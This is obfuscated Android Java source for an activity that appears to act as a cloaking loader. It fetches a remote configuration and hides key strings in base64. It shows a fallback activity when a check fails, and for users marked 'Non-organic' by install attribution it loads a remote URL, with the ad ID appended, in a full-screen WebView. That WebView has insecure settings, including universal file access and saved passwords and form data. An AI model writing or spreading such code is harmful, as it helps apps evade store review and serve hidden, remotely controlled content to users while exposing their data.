package com.dsadsad.hiddenparadise.giflsd.wew;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebView;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.dsadsad.hiddenparadise.giflsd.MMMMM;
import com.dsadsad.hiddenparadise.giflsd.R;
import com.dsadsad.hiddenparadise.giflsd.wew.fdk.Cdd;

public class HP extends Activity {
    WebView wew;
    String ur;
    String ka;
    String fb;
    String sdsd = null;
    static public ValueCallback<Uri> ndsds;
    static public Uri lfdssf = null;
    static public ValueCallback<Uri[]> kfdfsfd;
    static public String jfdfsf;
    public static final int hdfsfdsf = 1;
    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(1024);
        setContentView(R.layout.hp);
        wew = findViewById(R.id.webViewFullApp);

        int d = MMMMM.d(this);
        if (d == 0){

            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String sds = Cdd.cdd();
                        sad(sds);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Fvd.fvd(fb,HP.this);

                                sdsd = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(MMMMM.decooo("c2F2ZWRVcmw="), "dsd");

                                if (sdsd.equals("dsd")) {

                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            stW();
                                            diyr();
                                        }
                                    },5000);

                                }else {
                                    stW();
                                    wew.loadUrl(sdsd);
                                }


                            }
                        });

                    }catch (Exception e){

                        startActivity(new Intent(HP.this, MMMMM.class));
                        finishAffinity();
                    }
                }
            }).start();

        }else {

            startActivity(new Intent(this, MMMMM.class));
            finishAffinity();
        }

    }


    private void sad(String sd){
        String [] ds = sd.split("\\\u007C");
        ur = ds[0];
        ka = ds[1];
        fb = ds[2];
    }

    private void stW(){

        CookieManager.getInstance().setAcceptThirdPartyCookies(wew, true);
        CookieManager.getInstance().setAcceptCookie(true);
        wew.setVisibility(View.VISIBLE);
        wew.getSettings().setAllowFileAccessFromFileURLs(true);
        wew.getSettings().setSavePassword(true);
        wew.getSettings().setDatabaseEnabled(true);
        wew.getSettings().setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH);
        wew.getSettings().setCacheMode(android.webkit.WebSettings.LOAD_DEFAULT);
        wew.getSettings().setAppCacheEnabled(true);
        wew.getSettings().setLoadsImagesAutomatically(true);
        wew.setSaveEnabled(true);
        wew.getSettings().setMixedContentMode(0);
        wew.setFocusable(true);
        wew.getSettings().setAllowUniversalAccessFromFileURLs(true);
        wew.getSettings().setJavaScriptEnabled(true);
        wew.getSettings().setAllowContentAccess(true);
        wew.getSettings().setLoadWithOverviewMode(true);
        wew.getSettings().setEnableSmoothTransition(true);
        wew.getSettings().setUseWideViewPort(true);
        wew.getSettings().setSaveFormData(true);
        wew.getSettings().setAllowFileAccess(true);
        wew.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        wew.getSettings().setDomStorageEnabled(true);
        wew.setFocusableInTouchMode(true);

        wew.setWebViewClient(new WebClient(this));
        wew.setWebChromeClient(new WebChrome(this));


    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private  void diyr(){

        String kfsdfsd = Ap.ppoiuy;
        String irts = null;
        if (kfsdfsd.equals(MMMMM.decooo("Tm9uLW9yZ2FuaWM="))){
            irts = ur + Ap.jfjdj;
            wew.loadUrl(irts);
        }else if(Fvd.jjjjj != null) {
            irts = ur + Fvd.ieiiei;
            wew.loadUrl(irts);
        }else {
            if (ka.equals(MMMMM.decooo("Tk8="))) {
                startActivity(new Intent(getApplicationContext(), MMMMM.class));
                finishAffinity();
            }else {
                String strAppsFlyer = ka + "?bundle=" + getPackageName() + "&ad_id=" + Ap.qqwqew + "&apps_id=" + Ap.kkkksdsk;
                irts = ur + strAppsFlyer;
                wew.loadUrl(irts);
            }
        }


    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode != hdfsfdsf || kfdfsfd == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        jdfs(resultCode, data);
        if (ndsds == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        lhhs(resultCode, data);
    }

    private void jdfs(int resultCode, Intent data){
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (jfdfsf != null) {
                    results = new Uri[]{Uri.parse(jfdfsf)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        kfdfsfd.onReceiveValue(results);
        kfdfsfd = null;
    }


    private void lhhs(int resultCode, Intent data){

        Uri kfdsf = null;
        try {
            if (resultCode != RESULT_OK) {
                kfdsf = null;
            } else {
                kfdsf = data == null ? lfdssf : data.getData();
            }
        } catch (Exception e) { }
        ndsds.onReceiveValue(kfdsf);
        ndsds = null;
    }


    @Override
    public void onBackPressed() {
        if (wew.isFocused() && wew.canGoBack()) {
            wew.goBack();
        }
    }
}
